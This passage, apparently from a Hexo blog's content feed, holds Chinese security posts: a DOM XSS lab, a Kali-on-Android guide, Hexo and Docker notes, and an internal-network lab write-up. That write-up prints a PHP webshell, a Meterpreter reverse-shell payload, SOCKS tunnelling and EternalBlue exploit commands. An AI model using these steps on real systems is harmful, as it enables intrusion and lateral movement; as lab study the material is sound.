spellcheck="true">//从localstorage中的record中取数据存到val</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>val<span class="token operator">!=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                                        <span class="token comment" spellcheck="true">//如果val不为空</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.history'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">,</span><span class="token string">'block'</span><span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">//定义类history的css</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.history'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">'&lt;a href="/?search='</span><span class="token operator">+</span>val<span class="token operator">+</span><span class="token string">'">'</span><span class="token operator">+</span>val<span class="token operator">+</span><span class="token string">'&lt;/a>'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//类history的将会增加这一对包含val的标签</span>         <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.history'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">,</span><span class="token string">'none'</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//否则将不显示任何东西</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.search-btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token comment" spellcheck="true">//用于存取数据到浏览器的localstorage</span>        <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.search-ipt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//将输入框的数据存到val中</span>        localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'record'</span><span class="token punctuation">,</span>val<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//将val的数据再存到localstorage中的record中</span>        <span class="token punctuation">}</span>    <span class="token punctuation">)</span></code></pre></li><li><p>分析代码，我们发现可以有两处可控制的val，造成反射型的XSS</p><p><img src="/2020/07/19/%EF%BC%88%E4%B8%80%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8F%8D%E5%B0%84%E5%9E%8B/clipboard.png" alt></p></li><li><p>我们直接使用测试函数<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></p><p><img src="/2020/07/19/%EF%BC%88%E4%B8%80%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8F%8D%E5%B0%84%E5%9E%8B/clipboard(4).png" alt></p></li><li><p>点击搜索后刷新页面再输入任意值会出现XSS弹窗</p><p><img src="/2020/07/19/%EF%BC%88%E4%B8%80%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8F%8D%E5%B0%84%E5%9E%8B/clipboard(5).png" alt></p></li><li><p>此时可以在控制台中看到record的值就为<code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code></p><p><img src="/2020/07/19/%EF%BC%88%E4%B8%80%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8F%8D%E5%B0%84%E5%9E%8B/clipboard(3).png" alt></p></li><li><p>如果想重新实验，可将<code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code>从record中删去</p></li></ul><h5 id="知识拓展"><a href="#知识拓展" class="headerlink" title="知识拓展"></a>知识拓展</h5><ul><li><p>Local Storage</p><ul><li><p>一般在使用搜索框的时候，为了方便都会有历史记录这个功能。而历史记录一般存放在localstorage中</p><p><img src="/2020/07/19/%EF%BC%88%E4%B8%80%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8F%8D%E5%B0%84%E5%9E%8B/clipboard(1).png" alt></p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何打造口袋里的渗透平台（一）</title>
      <link href="/2020/06/02/linuxdeploy2/"/>
      <url>/2020/06/02/linuxdeploy2/</url>
      
        <content type="html"><![CDATA[<p>相信大家都玩过或者听过看门狗这款游戏，游戏里一位精通黑客技术的高手，于是他决定利用自己的特长来惩治全城的腐败分子，惩奸除恶。在游戏中他经常使用的作案工具就是一部手机，那么今天就教大家如何在安卓设备上安装KALI Linux渗透平台。</p><p>这里先放一张成品图<br><img src="/2020/06/02/linuxdeploy2/1.png" alt></p><ol><li><p>工具准备</p><p><strong>一台已经获取root权限的安卓设备<br>BusyBox.apk<br>Linux Deploy.apk<br>JuiceSSH.apk<br>VNC Viewer.apk</strong><br><img src="/2020/06/02/linuxdeploy2/2.png" alt></p></li><li><p>BusyBox的设置</p><p>BusyBox 是一个集成了三百多个最常用Linux命令和工具的软件。BusyBox 包含了一些简单的工具，例如ls、cat和echo等等，还包含了一些更大、更复杂的工具，例grep、find、mount以及telnet。有些人将 BusyBox 称为 Linux 工具里的瑞士军刀。简单的说BusyBox就好像是个大工具箱，它集成压缩了 Linux 的许多工具和命令，也包含了 Android 系统的自带的shell。</p><p>这里我们使用的BusyBox是 <a href="https://github.com/meefik" target="_blank" rel="noopener">meefik</a> 大佬的BusyBox，简单易用，一键安装<br>1）打开界面是这样的，一片English，看不懂没关系，我也看不懂。<br><img src="/2020/06/02/linuxdeploy2/3.png" alt><br>2）打开左上角的三条杠，选择Settings进入设置界面，在<strong>Install path</strong>输入<br><strong>/system/xbin</strong>（这步很重要，后面还会说到）<br><img src="/2020/06/02/linuxdeploy2/4.png" alt><br>3）返回主界面，点击右下角INSTALL进行安装，安装后的正常界面应该是这样的<br><img src="/2020/06/02/linuxdeploy2/5.png" alt><br>4）为了确认是否安装成功还可以点击左上三条杠，选择Information，如果这里出现了yes，就说明你安装成功了<br><img src="/2020/06/02/linuxdeploy2/6.png" alt></p></li><li><p>Linux Deploy的设置</p><p>1）打开Linux Deploy的主界面是这样的<br><img src="/2020/06/02/linuxdeploy2/7.png" alt></p><p>2）打开左上三条杠进入设置，先将Language设置成中文，然后在PATH变量中输入之前在BusyBox中设置的安装变量<br><img src="/2020/06/02/linuxdeploy2/8.png" alt></p><p>3）打开主界面右上设置，选择我们需要的系统，并对其配置，这里我选择的系统发行版本是KALI<br><img src="/2020/06/02/linuxdeploy2/9.png" alt></p><p>4）配置源地址，选择国内镜像源可以加快我们的安装速度，这里我选择的是阿里的源：<code>http://mirrors.aliyun.com/kali/</code><br><img src="/2020/06/02/linuxdeploy2/10.png" alt></p><p>5）选择镜像大小，这里看你后期需要的是完整版还是精简版，如果是完整版那最好是设置成16G的大小，当然如果你手机吼得住的话，你可以尽量大些，我选择的是4000M<br><img src="/2020/06/02/linuxdeploy2/11.png" alt></p><p>6）设置用户名和密码，按照安装惯例，我习惯直接用root用户名，密码设置成toor<br><img src="/2020/06/02/linuxdeploy2/12.png" alt></p><p>7）挂载本机的资源，如果你想在KALI中能够访问到本机的文件的话需要设置这一项<br><img src="/2020/06/02/linuxdeploy2/13.png" alt></p><p><img src="/2020/06/02/linuxdeploy2/14.png" alt><br>8）启用SSH，启用了这项我们才能用JuiceSSH连接用命令行控制KALI系统<br><img src="/2020/06/02/linuxdeploy2/15.png" alt></p><p>9）图形界面，图形界面有两种方式可以启动，一个是<strong>XSDL</strong>，一个是<strong>VNC</strong>，这里我选择的是VNC，VNC会比较方便些配合<strong>VNC Viewer</strong>使用，可以快速启动，而<strong>XSDL</strong>的方式相对来说会比较麻烦，但是体验比较流畅。接下来是选择桌面的种类，官方是给出四种类型，分别是XTerm，LXDE，Xfce，MATE<strong>XTerm</strong>：只有一个终端界面，最不方便的<strong>LXDE</strong>：轻量级的桌面，安装所需的空间很小，也很流畅，就是过分精简<strong>Xfce</strong>：体验最好的桌面，官方经常更新，界面美观，操作方便<strong>MATE</strong>：快捷键方便点，界面普普通通，不够人性化，这里我选择的是<strong>Xfce桌面</strong></p><p><img src="/2020/06/02/linuxdeploy2/16.png" alt></p><p>10）其他选项默认就可以了，回到主界面，点击右上三点，选择安装，耐心等待<br><img src="/2020/06/02/linuxdeploy2/17.png" alt></p><p><img src="/2020/06/02/linuxdeploy2/18.png" alt></p><p>11）安装成功后是这样的，最底下会出现个deploy<br><img src="/2020/06/02/linuxdeploy2/19.png" alt></p></li><li><p>无图形化启动</p><p>上步说到出现个deploy就算安装成功了，但是这里还需要我们点下右上停止，否则会启动失败<br><img src="/2020/06/02/linuxdeploy2/20.png" alt></p><p>然后再启动，必须这三个地方都出现done时才算成功<br><img src="/2020/06/02/linuxdeploy2/21.png" alt></p><p>接着我们就得用到JuiceSSH了，这里也可以用别的ssh连接软件<br>1）进入JuiceSSH选择快速连接<br><img src="/2020/06/02/linuxdeploy2/22.png" alt></p><p>2）输入127.0.0.1，接着会要求我们新建个认证，认证名随便输，然后得输入我们安装系统时的用户名和密码了，root和toor<br><img src="/2020/06/02/linuxdeploy2/23.png" alt></p><p>3）最终效果<br><img src="/2020/06/02/linuxdeploy2/24.png" alt></p></li><li><p>图形化启动</p><p>图形化启动需要用到VNC Viewer，关于XSDL的图形化启动以后会讲到<br>1）进入VNC Viewer主界面点击+号创建<br><img src="/2020/06/02/linuxdeploy2/25.png" alt></p><p>2）输入本机IP地址以及端口号，昵称随便填，注意，这里端口号是0，<code>127.0.0.1:0</code><br><img src="/2020/06/02/linuxdeploy2/26.png" alt></p><p>3）创建成功后选择连接<br><img src="/2020/06/02/linuxdeploy2/27.png" alt></p><p>4）输入密码toor，这里可以勾上记住密码就不必老是输入才能登陆了<br><img src="/2020/06/02/linuxdeploy2/28.png" alt></p><p>5）最终<br><img src="/2020/06/02/linuxdeploy2/29.png" alt></p></li></ol><p>后期还需要完善，软件更新，以及必要软件的安装，特别是好多渗透工具都还没有预装，需要我们自己安装，这些我都会在后面的篇章中介绍方法。</p>]]></content>
      
      
      <categories>
          
          <category> 折腾瞎搞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KALI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo个人博客快速搭建</title>
      <link href="/2020/06/02/hexo_Blog_crate/"/>
      <url>/2020/06/02/hexo_Blog_crate/</url>
      
        <content type="html"><![CDATA[<h5 id="1-安装-Git-Bash"><a href="#1-安装-Git-Bash" class="headerlink" title="1. 安装 Git Bash"></a>1. 安装 Git Bash</h5><p>&emsp;Git官方网站 <a href="https://git-scm.com/downloads" target="_blank" rel="noopener">https://git-scm.com/downloads</a></p><h5 id="2-安装-Node-js"><a href="#2-安装-Node-js" class="headerlink" title="2. 安装 Node js"></a>2. 安装 Node js</h5><p>&emsp;Node.js官方网站 <a href="http://nodejs.cn/" target="_blank" rel="noopener">http://nodejs.cn/</a></p><h5 id="3-安装hexo"><a href="#3-安装hexo" class="headerlink" title="3. 安装hexo"></a>3. 安装hexo</h5><pre><code>npm install -g hexonpm install hexo-deployer-git --save</code></pre><h5 id="4-添加github账号和邮箱"><a href="#4-添加github账号和邮箱" class="headerlink" title="4. 添加github账号和邮箱"></a>4. 添加github账号和邮箱</h5><p>&emsp;首先在github中创建一个仓库，仓库格式为<strong>yourname.github.io</strong>，其中yourname为你的github账户名</p><p>&emsp;然后在git终端里，添加你的github账号和注册的邮箱</p><pre><code>git config --global user.name &quot;yourname&quot;git config --global user.email &quot;youremail&quot;</code></pre><h5 id="5-创建ssh"><a href="#5-创建ssh" class="headerlink" title="5. 创建ssh"></a>5. 创建ssh</h5><p>&emsp;在git终端中输入 ssh-keygen -t rsa -C “<a href="mailto:youremail@example.com">youremail@example.com</a><br>&emsp;生成ssh，然后在生成的信息中找到id_rsa.pub 的路径，找到胡将 id_rsa.pub 的内容复制到github的SSH keys里<br>&emsp;验证是否成功在终端中输入 ssh -T <a href="mailto:git@github.com">git@github.com</a></p><h5 id="6-先介绍下hexo的一些命令"><a href="#6-先介绍下hexo的一些命令" class="headerlink" title="6. 先介绍下hexo的一些命令"></a>6. 先介绍下hexo的一些命令</h5><pre><code>hexo init #初始化博客内容，刚安装hexo需要的操作hexo clean #清理缓存文件hexo generate #生成静态文件hexo server #用于启动本地服务，测试用hexo deploy #部署网站hexo new &quot;news&quot; #新建文章</code></pre><h5 id="7-修改网站配置文件"><a href="#7-修改网站配置文件" class="headerlink" title="7. 修改网站配置文件"></a>7. 修改网站配置文件</h5><p>&emsp;打开博客根目录，找到 _config.yml</p><pre><code>deploy:    type: git    repo: https://github.com/yourname/yournname.github.io.git</code></pre><h5 id="8-部署博客"><a href="#8-部署博客" class="headerlink" title="8. 部署博客"></a>8. 部署博客</h5><pre><code>hexo chexo ghexo d或者hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>最后在浏览器中输入yourname.github.io就可以看到你的Blog了</p><h5 id="9-小书匠绑定第三方数据和图床"><a href="#9-小书匠绑定第三方数据和图床" class="headerlink" title="9. 小书匠绑定第三方数据和图床"></a>9. 小书匠绑定第三方数据和图床</h5><p>&emsp;########################</p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次内网渗透的实验</title>
      <link href="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/"/>
      <url>/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>实验是很久以前的，一直在笔记里放灰</p><p>靶机里有两张网卡一张是NAT用来模拟外网，一张是仅限主机模式，用来模拟内网</p><p>靶机上有个站点，可以通过外网访问</p><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(5).png" alt></p><p>看关于网站，可以得知网站是什么CMS</p><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(8).png" alt></p><p>可以找到上传点</p><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard.png" alt></p><p>随便上传一个文件，再抓包，发现可以改包上传其他文件</p><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(7).png" alt></p><p>我们上传一个一句话木马</p><pre><code>data:image/php;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk/Pg==经过URL编码后：data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk%2FPg%3D%3D</code></pre><p>将更改后的包放出去</p><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(3).png" alt></p><p>显示虽然上传失败，但是其实是上传成功的</p><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(11).png" alt></p><p>用菜刀连接</p><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(6).png" alt></p><p>因为系统权限不够，做不了代理，所以需要上传另一个后门</p><p>&emsp;先在kali用msfvenom生成反向连接后门</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.129  lport=12345 -f exe &gt;shell.exe</code></pre><p>&emsp;用菜刀上传该后门</p><p>&emsp;kali开启监听</p><pre><code>msfconsoleuse exploit/multi/handlerset payload windows/windows/x64/meterpreter/reverse_tcpset lhost 192.168.10.129set lport 12345run</code></pre><p>&emsp;在菜刀终端中执行后门</p><p>&emsp;获得meterpreter会话</p><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(12).png" alt></p><p>&emsp;绑定稳定进程</p><pre><code>migrate 6912</code></pre><p>&emsp;查看权限</p><pre><code>getuid</code></pre><p>&emsp;提升权限</p><pre><code>getsystem</code></pre><p>&emsp;进入shell</p><pre><code>shell</code></pre><p>&emsp;发现内网网段</p><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(10).png" alt></p><p>&emsp;接下来可以做代理，也可以做静态路由</p><p>&emsp;那么就先试试做代理吧</p><p>&emsp;kali先开启监听</p><pre><code>./ew_for_linux -s rcsocks -e 8888 -l 1080</code></pre><p>&emsp;在靶机上</p><pre><code>ew.exe -s rssocks -d 192.168.10.129 -e 8888</code></pre><p>&emsp;成功连接</p><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(2).png" alt></p><p>&emsp;接下来就得使用代理工具proxychains了</p><p>&emsp;用vim编辑/etc/proxychains.conf</p><pre><code>在最后一行加入socks5 127.0.0.1 1080注释掉其他的代理地址</code></pre><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/1.png" alt></p><p>&emsp;需要使用代理在命令前加proxychains<br>&emsp;例如：proxychains msfconsole<br>&emsp;使用代理之后我们就可以访问内网了</p><p>搜索内网中能使用ms17-010漏洞的主机</p><pre><code>proxychains msfconsolesearch ms17-010use auxiliary/scanner/smb/smb_ms17_010set rhosts 10.10.10.130-10.10.10.135run</code></pre><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(9).png" alt></p><p>&emsp;那我们可以开始使用攻击模块了</p><pre><code>use exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/reverse_tcpset rhosts 10.10.10.133set lhost 192.168.10.10run</code></pre><p>&emsp;开始攻击</p><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(1).png" alt></p><p>&emsp;但是最后我没有成功，可能是虚拟机的问题，最后使用静态路由也没法成功，应该是虚拟机问题</p><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(4).png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker入门命令总结</title>
      <link href="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/"/>
      <url>/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<ul><li><h4 id="什么是docker"><a href="#什么是docker" class="headerlink" title="什么是docker"></a>什么是docker</h4><ul><li>Docker 是一个开源的应用容器引擎，让开发者可以方便地打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。</li></ul></li><li><h4 id="用docker可以做什么"><a href="#用docker可以做什么" class="headerlink" title="用docker可以做什么"></a>用docker可以做什么</h4><ul><li>对于安全工作者来说，搭建测试环境和靶场是不可避免的，而docker能够方便快速地帮助我们搭建一个环境</li></ul></li><li><h4 id="我总结的常用命令"><a href="#我总结的常用命令" class="headerlink" title="我总结的常用命令"></a>我总结的常用命令</h4></li></ul><h5 id="搜索需要的镜像"><a href="#搜索需要的镜像" class="headerlink" title="搜索需要的镜像"></a>搜索需要的镜像</h5><pre><code>docker search 镜像名</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/1.png" alt></p><h5 id="拉取需要的镜像"><a href="#拉取需要的镜像" class="headerlink" title="拉取需要的镜像"></a>拉取需要的镜像</h5><pre><code>docker pull 镜像名</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/2.png" alt></p><h5 id="查看是否拉取到镜像"><a href="#查看是否拉取到镜像" class="headerlink" title="查看是否拉取到镜像"></a>查看是否拉取到镜像</h5><pre><code>docker images</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/3.png" alt></p><h5 id="如果想从本地导入镜像该怎么做"><a href="#如果想从本地导入镜像该怎么做" class="headerlink" title="如果想从本地导入镜像该怎么做"></a>如果想从本地导入镜像该怎么做</h5><pre><code>docker load &lt; 镜像路所在路径</code></pre><h5 id="下错镜像，你该怎么删除它"><a href="#下错镜像，你该怎么删除它" class="headerlink" title="下错镜像，你该怎么删除它"></a>下错镜像，你该怎么删除它</h5><pre><code>docker rmi 镜像ID</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard4.png" alt></p><h5 id="运行对应镜像在容器中，并立即进入容器内部"><a href="#运行对应镜像在容器中，并立即进入容器内部" class="headerlink" title="运行对应镜像在容器中，并立即进入容器内部"></a>运行对应镜像在容器中，并立即进入容器内部</h5><pre><code>docker run -it 镜像名 /bin/bash</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard5.png" alt></p><h5 id="如何从容器内部退出"><a href="#如何从容器内部退出" class="headerlink" title="如何从容器内部退出"></a>如何从容器内部退出</h5><pre><code>exit</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard6.png" alt></p><h5 id="如果我一开始只想在后台运行容器怎么办"><a href="#如果我一开始只想在后台运行容器怎么办" class="headerlink" title="如果我一开始只想在后台运行容器怎么办"></a>如果我一开始只想在后台运行容器怎么办</h5><pre><code>docker run -d 镜像名</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard7.png" alt></p><h5 id="查看容器运行状态"><a href="#查看容器运行状态" class="headerlink" title="查看容器运行状态"></a>查看容器运行状态</h5><pre><code>docker ps -a</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard8.png" alt></p><h5 id="想调试一个已经在后台运行的容器，该怎么进去"><a href="#想调试一个已经在后台运行的容器，该怎么进去" class="headerlink" title="想调试一个已经在后台运行的容器，该怎么进去"></a>想调试一个已经在后台运行的容器，该怎么进去</h5><pre><code>docker exec -it 容器ID bash</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard9.png" alt></p><h5 id="想进入容器内部，但是查看容器ID太麻烦了怎么办"><a href="#想进入容器内部，但是查看容器ID太麻烦了怎么办" class="headerlink" title="想进入容器内部，但是查看容器ID太麻烦了怎么办"></a>想进入容器内部，但是查看容器ID太麻烦了怎么办</h5><p>可以在运行容器的时候就给容器设置个性化名字,后面所有的容器操作都可以用自定义的容器名称去代替容器</p><pre><code>ID docker run -d --name minzi 镜像名 </code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard10.png" alt></p><h5 id="调试容器需要导入文件怎么办"><a href="#调试容器需要导入文件怎么办" class="headerlink" title="调试容器需要导入文件怎么办"></a>调试容器需要导入文件怎么办</h5><pre><code>docker cp 本地路径 容器ID:镜像路径</code></pre><h5 id="需要从容器中导出文件该怎么办"><a href="#需要从容器中导出文件该怎么办" class="headerlink" title="需要从容器中导出文件该怎么办"></a>需要从容器中导出文件该怎么办</h5><pre><code>docker cp 容器ID:镜像路径 本地路径</code></pre><h5 id="调试完容器想重启环境"><a href="#调试完容器想重启环境" class="headerlink" title="调试完容器想重启环境"></a>调试完容器想重启环境</h5><pre><code>docker restart 容器ID或者容器名</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard11.png" alt></p><h5 id="测试结束，想停止这个容器"><a href="#测试结束，想停止这个容器" class="headerlink" title="测试结束，想停止这个容器"></a>测试结束，想停止这个容器</h5><pre><code>docker stop 容器ID或者容器名</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard12.png" alt></p><h5 id="后面测试需要又需要用到环境"><a href="#后面测试需要又需要用到环境" class="headerlink" title="后面测试需要又需要用到环境"></a>后面测试需要又需要用到环境</h5><pre><code>docker start 容器ID或者容器名</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard13.png" alt></p><h5 id="如果运行容器出现端口冲突了怎么办"><a href="#如果运行容器出现端口冲突了怎么办" class="headerlink" title="如果运行容器出现端口冲突了怎么办"></a>如果运行容器出现端口冲突了怎么办</h5><pre><code>可以指定端口启动啊，比如指定用本地的5566端口去映射容器的3306端口，否则默认状态下是用相同端口去做映射的，所以只要本机3306端口被占用，不改端口是启动不了的 docker run -d -p 5566:3306  镜像名     </code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard14.png" alt></p><h5 id="如果我想导出这个配置好的容器到别人的电脑上怎么办"><a href="#如果我想导出这个配置好的容器到别人的电脑上怎么办" class="headerlink" title="如果我想导出这个配置好的容器到别人的电脑上怎么办"></a>如果我想导出这个配置好的容器到别人的电脑上怎么办</h5><pre><code>docker commit 容器id 镜像名:标签名                先将容器保存为为镜像</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard15.png" alt></p><pre><code>docker save -o httpd.tar 镜像名:标签名           导出这个镜像</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard16.png" alt></p><pre><code>然后和导入本地镜像一样docker load &lt; httpd.tar</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard17.png" alt></p><h5 id="在别人电脑上用完容器后，你是不是应该删除它"><a href="#在别人电脑上用完容器后，你是不是应该删除它" class="headerlink" title="在别人电脑上用完容器后，你是不是应该删除它"></a>在别人电脑上用完容器后，你是不是应该删除它</h5><pre><code>docker rm 容器ID或者容器名            可批量删除</code></pre><p><img src="/2020/01/09/docker%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/clipboard18.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware安装旧版本vmtools</title>
      <link href="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/"/>
